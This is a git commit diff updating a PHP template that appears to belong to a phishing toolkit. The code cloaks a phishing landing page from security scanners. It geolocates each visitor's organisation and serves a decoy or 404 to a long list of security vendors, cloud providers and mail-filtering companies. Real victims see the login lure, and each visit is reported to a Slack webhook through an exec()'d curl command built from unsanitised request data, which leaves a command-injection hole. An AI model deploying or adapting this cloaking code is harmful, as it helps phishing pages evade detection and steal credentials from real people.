c79d23375c45a052d4fd55816b7b559dcfc16fb7
Curtis Brazzell <curtbraz@gmail.com>
2023-09-08 21:36:22 -0400

    Update BlacklistBypassTemplate.php

--- html/BlacklistBypassTemplate.php
+++ html/BlacklistBypassTemplate.php
@@ -1,24 +1,41 @@
 <?php
 
-// Enter Your Phishing URL Below
-$url = "URL OF YOUR LANDING PAGE HERE";
+// Gets URI that's accessed
+$url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+
+// Determines if the URI is an IP or Domain (blocks if IP)
+$parts = parse_url($url);
+$isIP = (bool)ip2long($parts['host']);
 
 $allowed = "- *Accessed Phishing Site* -";
 
 // This section of code doesn't allow Gmail or Microsoft to inspect links to avoid blacklisting
 $ip = $_SERVER['REMOTE_ADDR'];
+// Can set your IP manually to see what Google sees
+//$ip = "8.8.8.8";
 $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
 $org = $details->org;
 
 // List of Orgs to be Blacklisted
-$blockorgs = array("Google","Microsoft","Forcepoint","Mimecast","ZSCALER","Fortinet","Amazon","PALO ALTO","RIPE","McAfee","M247","Internap","AS205100","YISP","Kaspersky","Berhad","DigitalOcean","IP Volume","Markus","ColoCrossing","Norton","Datacamp Limited","Scalair SAS","NForce Entertainment","Wintek Corporation","ONLINE S.A.S.","WestHost","Labitat","Orange Polska Spolka Akcyjna","OVH SAS","DediPath","AVAST","GoDaddy","SunGard","Netcraft","Emsisoft","CHINANET","Rackspace","Selectel","Sia Nano IT","AS1257","Zenlayer","Hetzner","AS51852","TalkTalk Communications","Spectre Operations","VolumeDrive","Powerhouse Management","HIVELOCITY","SoftLayer Technologies","AS3356","AS855","AS7459","AS42831","AS61317","AS5089","Faction","Plusnet","Total Server","AS262997","AS852","Guanghuan Xinwang","AS174","AS45090","AS41887","Contabo","IPAX","AS58224","AS18002","HangZhou","Linode","AS6849","AS34665","SWIFT ONLINE BORDER","AS38511","AS131111","Telefonica del Peru","BRASIL S.A","Merit Network","Beijing","QuadraNet","Afrihost","Vimpelcom","Allstream","Verizon","HostRoyale","Hurricane Electric","AS12389","Packet Exchange","AS52967","AS45974","Fastweb","AS17552","Alibaba","AS12978","AS43754","CariNet","AS28006","Free Technologies","DataHata","GHOSTnet","AS55720","Emerald Onion","AS208323","AS6730","AS11042","AS53667","AS28753","AS28753","Globalhost d.o.o","AS133119","Huawei","FastNet","AS267124","BKTech","Optisprint","AS24151","Pogliotti","321net","AS4800","Kejizhongyi","SIMBANET","AS42926","Web2Objects","AS12083");
+$filename = "/var/www/html/blacklist.txt";
 
-if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m)) {
+// Open the file
+$fp = @fopen($filename, 'r'); 
 
-// Content for Orgs to see on the Blacklist
-//echo "<HTML><BODY><IMG SRC=\"https://i.imgflip.com/42oih3.jpg\"></HTML></BODY>";
+// Add each line to an array
+if ($fp) {
+   $blockorgs = explode("\r\n", fread($fp, filesize($filename)));
+}
+//Block via blacklist
+// Can whitelist your IP only (useful before "go live" for campaign). Need to switch comments for IF statements below.
+//if($ip != "YOUR_IP_HERE!") {
+if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m) OR $isIP == true) {
+
+// Content for Orgs to see on the Blacklist (What everyone else sees)
+echo "<HTML><BODY><IMG SRC=\"https://i.imgflip.com/42oih3.jpg\"></HTML></BODY>";
+
 // Respond With 404 Instead of Image. More Likely to Fool URL Checkers
-header('HTTP/1.0 404 not found'); 
+//header('HTTP/1.0 404 not found'); 
   
 $allowed = "- *Jedi Mind Trick Successful* -";
 
@@ -29,12 +46,22 @@ $allowed = "- *Jedi Mind Trick Successful* -";
 
 
 // PUT YOUR PHISHING CONTENT WITHIN THESE ELSE BRACKETS!!!!
+?>
+
+<HTML><BODY>Log in here!</BODY></HTML>
 
 
 
 
 
-$allowed = "- *Jedi Mind Trick Not Successful* -";
+
+
+
+<?php
+
+
+
+$allowed = "- *Allowed* -";
 }
 
 if($allowed == "- *Jedi Mind Trick Successful* -"){$jedi = 1;}else{$jedi = 0;}
@@ -51,7 +78,7 @@ $message = ">".$url." was visited by ".$ip.". ".$allowed." (`".$org."`)";
 }
 
 // Set Slack Information Here
-$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "#phishing", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": ":bell:"}\' https://hooks.slack.com/services/YOUR_SLACK_WEBOOK_HERE';
+$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "#general", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": ":bell:"}\' https://hooks.slack.com/services/SLACK_TOKEN_HERE';
 //echo $cmd;
 exec($cmd);
 
